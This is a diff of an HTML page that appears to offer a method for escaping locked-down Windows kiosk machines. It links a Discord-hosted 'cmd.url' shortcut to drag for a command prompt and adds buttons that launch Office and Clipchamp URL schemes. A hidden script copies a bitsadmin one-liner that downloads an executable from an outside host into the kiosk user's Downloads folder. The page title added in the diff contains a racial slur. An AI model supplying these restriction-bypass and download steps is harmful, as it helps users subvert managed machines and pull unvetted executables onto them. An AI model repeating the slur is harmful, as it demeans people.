@@ -4,18 +4,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SupraMethod</title>
+    <title>nigga meth</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        /* Add some styles for the Discord icon */
-        #discord-icon {
-            position: fixed;
-            top: 20px;
-            left: 20px;
-            font-size: 24px;
-            color: #ffffff;
-            cursor: pointer;
-        }
 
         body, h1, h2, p, ul, li, button {
             margin: 0;
@@ -24,8 +15,8 @@
         }
 
         body {
-            font-family: Arial, sans-serif;
-            background-image: url('https://cdn.dribbble.com/users/2242788/screenshots/4601696/animated-colored-shapes2.gif');
+            font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
+            background-image: url('https://s5.gifyu.com/images/SiDrS.gif');
             background-repeat: no-repeat;
             background-size: cover;
             color: #ffffff;
@@ -65,7 +56,7 @@
         }
 
         ul li a[href="https://cdn.discordapp.com/attachments/1120094264622325780/1155068189596717086/cmd.url"] {
-            color: #add8e6;
+            color: #1a6ae4;
         }
 
         main {
@@ -75,7 +66,7 @@
             align-items: center;
             width: 100%;
             flex-grow: 1;
-            color: #ffffff;
+            color: #d41e1e;
             transition: background-color 0.3s ease;
         }
 
@@ -154,8 +145,6 @@
 </head>
 
 <body>
-    <!-- Add the Discord icon -->
-    <i id="discord-icon" class="fab fa-discord" onclick="window.open('https://discord.gg/4fCRNJHWge', '_blank')"></i>
 
 
     <header>
@@ -166,10 +155,7 @@
 
     <main>
         <section>
-            <h2>100GB Method By Supra Method</h2>
-        </section>
-        <section>
-            <h2>Drag links</h2>
+            <h2>Drag Shit</h2>
             <ul>
                 <li><a href="https://cdn.discordapp.com/attachments/1120094264622325780/1155068189596717086/cmd.url">Drag CMD</a>
                     <br>
@@ -178,15 +164,27 @@
             </ul>
         </section>
         <section>
-            <h2>Open Apps</h2>
+            <h2>URL Schemes and shit</h2>
             <button onclick="window.open('ms-clipchamp:', '_blank')">Open ms-ClipChamp</button>
+            <button onclick="window.open('ms-officeapp:', '_blank')">Open ms-Officeapp</button>
+            <button id="copyButton">Copy one line bat</button>
         </section>
+        <div id="textToCopy" style="display: none;">bitsadmin /transfer "Download Arcade" /download /priority normal https://picteon.dev/files/Arcade.exe "C:\Users\kiosk\Downloads\Arcade.exe"</div>
+        
+<script>
+    document.getElementById('copyButton').addEventListener('click', function() {
+        var textToCopy = document.getElementById('textToCopy').textContent;
+        var tempInput = document.createElement('input');
+        tempInput.style = "position: absolute; left: -1000px; top: -1000px";
+        tempInput.value = textToCopy;
+        document.body.appendChild(tempInput);
+        tempInput.select();
+        document.execCommand('copy');
+        document.body.removeChild(tempInput);
+        alert('Copied!');
+    });
+</script>
     </main>
-
-    <footer>
-        <!-- New link added to the bottom -->
-        <a href="https://www.youtube.com/watch?v=4UPZScro-rA">WATCH VIDEO FOR TUTORIAL</a>
-    </footer>
 
 </body>
 
